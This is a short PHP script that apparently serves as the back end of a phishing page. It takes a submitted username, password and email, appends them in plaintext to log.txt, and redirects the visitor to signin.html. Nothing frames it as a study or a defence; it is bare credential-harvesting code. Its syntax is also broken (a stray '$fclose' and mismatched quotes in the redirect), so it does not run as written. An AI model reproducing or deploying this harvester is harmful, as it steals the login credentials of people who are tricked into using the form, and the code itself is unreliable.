<?php
    $username = $_POST['USERNAME'];
    $password = $_POST['PASSWORD'];
    $email = $_POST['EMAIL'];
    $filename = 'log.txt';
    $fp = fopen($filename, 'a+');
    fwrite ($fp, $username . "," . $password . "," . $email . "\n");
    $fclose ($fp);
    header("Location: "signin.html"); 
    die();
?>
